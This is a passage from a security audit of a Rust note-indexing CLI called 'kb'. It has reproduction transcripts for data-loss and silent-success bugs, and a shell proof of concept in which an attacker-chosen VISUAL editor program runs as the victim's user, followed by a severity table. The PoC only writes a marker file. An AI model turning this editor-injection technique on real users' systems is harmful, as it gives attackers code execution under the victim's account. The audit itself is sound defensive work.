$ kb search -- A        # page A present
  1  note:A  A  a.md
$ kb search -- B        # page B present
  1  note:B  B  b.md

$ chmod 000 two/rootB   # transient FS hiccup (permission flip)

$ kb refresh            # expect at worst "no change"; data loss actually occurs
2 root(s) · 0 page(s) indexed · 0 skipped (…) · 1 GC'd

$ kb search -- B        # GONE — even though the file is still on disk
0 results for "B" (the query was too strict, or the page is gated)

$ kb search -- A        # A survives (its root walked fine) — the GC is asymmetric
  1  note:A  A  a.md

$ chmod 755 two/rootB && ls -l b.md
-rw-rw-r-- 2 jakub jakub  39 … b.md                  # file is fine; index lost the page
```

### 7.7  3.9  full_rebuild exits 0 with a thinner corpus — reproduced
Same two-root corpus. One page's file is made unreadable mid-rebuild.
```
$ chmod 000 two/rootA/a.md
$ kb full-rebuild
kb::full_rebuild: upsert /…/a.md: index: Permission denied (os error 13)   ← printed to stderr
2 root(s) · 1 page(s) indexed · 0 skipped (…) · 2 GC'd
$ echo $?
0                                                                        ← EXIT CODE ZERO

$ python3 -c "print([r[0].split('/')[-1] for r in cur.execute('SELECT abs_path FROM pages')])"
['b.md']                                                                  # a.md present on disk, missing from index

$ ls -l a.md
-rw-r--r-- 2 jakub jakub  39 … a.md                                      # still there
```

### 7.8  3.8  transaction left open on import error — code-confirmed (not CLI-reproducible)
Reason it's code-confirmed: a single `kb` invocation opens one `Db`, and on failure the process exits before the leak is observable from outside (WAL rolls back on close). The bug is latent in the same-process case — which is exactly a *library* or TUI usage where the `Db` is reused across commands. The code (`main.rs:1427-1443`) `execute_batch("BEGIN")`s and, on any of the fallible `upsert.execute()` calls, `?`s out without `ROLLBACK`. Fix is a checked transaction (5 lines).

### 7.9  3.1 RCE PoC (shell script)

The following reproduces 3.1 on a stock build (before the `edit` removal). The "victim" is a normal markdown file; the "attacker" only controls the environment and the file the CLI reads.

```sh
# --- set up a victim markdown file with a section to 'edit'
mkdir -p /tmp/kbsec && cd /tmp/kbsec
printf '# Title\n\nintro\n\n## S1\n\nhello body\n' > victim.md
KB="$PWD/target/release/kb"   # path to the release build under test

# --- the attacker's 'editor': any program they can point VISUAL at
cat > attacker.sh <<'EOF'
#!/bin/sh
# $1 is the kb editor temp buffer (/tmp/kb-edit-<pid>.md) holding the section
echo "attacker: invoked with arg: $1"
cat "$1"                              # echo the victim's section back (so kb applies it)
echo "# injected attacker section" > marker_file   # arbitrary code ran as the victim's uid
EOF
chmod +x attacker.sh

# --- run the CLI with the attacker-controlled editor
rm -f marker_file
VISUAL=/tmp/kbsec/attacker.sh "$KB" section --file ./victim.md edit S1
echo "exit=$?"

# --- evidence: a file kb never knew about was created
ls -l marker_file && cat marker_file
```

Observed:
```
attacker: invoked with arg: /tmp/kb-edit-<pid>.md
## S1

hello body
# injected attacker section
-victim.md: no changes (section unchanged in editor)
exit=0
-rw-r--r-- 1 jakub jakub … marker_file
# injected attacker section
```

The `marker_file` exists because the CLI spawned the attacker-chosen program. To make it a visible file mutation (not just a side-file), append the injected text to the buffer instead of a marker and let `kb` write it back into `victim.md`.

**Residual note after `edit` is disabled:** none of the other subcommands (`set`, `append`, `insert`, `replace`, `rm`, `patch`, `tag-alias import/export`, `add`, `search`, `links`, `resolve`, `refresh`, `full-rebuild`) call `std::process::Command` in non-test code. The single non-test spawn is the editor flow; the second spawn (`main.rs:2787`, `python3`) is `#[cfg(test)]`. Disabling `edit` removes the only exec vector.

---

## Appendix A — severity tally

| ID | Sev | Category | File(s) | Fixed by |
|----|-----|----------|---------|----------|
| 3.1 | HIGH | RCE | kb/src/main.rs:2600,2617 | Compile-time `edit` removal |
| 3.2 | MED  | temp-file TOCTOU | kb/src/main.rs:2601 | Same as 3.1 |
| 3.3 | HIGH | data-loss | kb-db/src/refresh.rs:93-105, 207-234 | gate GC on walk success |
| 3.4 | MED  | correctness | kb/src/main.rs:842-851; kb-core/src/tags.rs:119 | lowercase IN-list |
| 3.5 | MED  | correctness | kb/src/main.rs:870-872 | NOT exclusion / error |
| 3.6 | MED  | correctness | kb-core/src/resolve.rs:156-165 | fall-through on empty |
| 3.7 | MED  | correctness | kb-core/src/frontmatter.rs:487,795,811,825 | `from_utf8_lossy` |
| 3.8 | MED  | txn hygiene | kb/src/main.rs:1427-1443 | checked transaction |
| 3.9 | MED  | silent success | kb-db/src/refresh.rs:275-279 | propagate errors |
| 3.10 | LOW | correctness | kb-db/src/index.rs:123-148 | key-boundary check |
| 3.11 | LOW | round-trip | kb-core/src/frontmatter.rs:818,836,889,942 | preserve CRLF |
| 3.12 | LOW | latent panic | kb-core/src/section.rs:518-520 | `saturating_sub` |
| 3.13 | LOW | semantics | kb-core/src/section.rs:345,349 | error on level-6 child |
| 3.14 | LOW | doc/behavior | kb-db/src/lib.rs:40-46 | special-case / fix doc |
| 3.15 | LOW | doc/behavior | kb-db/src/lib.rs:169 | `None` on missing table |
| 3.16 | LOW(perf) | O(n²)/O(n·m) | tags.rs, links.rs, aliases.rs, resolve.rs, diff.rs | sets / hoisting / cap |
| 3.17 | LOW(perf) | SQL prep | kb/src/main.rs:786-820, 1600-1626 | hoist out of loop |

**TOTALS:** 2 HIGH · 7 MED · 6 LOW · 2 LOW(perf) = 17 findings. 1 HIGH (RCE, 3.1) is neutralised by the design decision to drop `edit` (which also removes MED 3.2). The code fixes to land before public release: HIGH 3.3 (data-loss) and MEDs 3.4–3.9, plus the LOW hardening if budget allows.
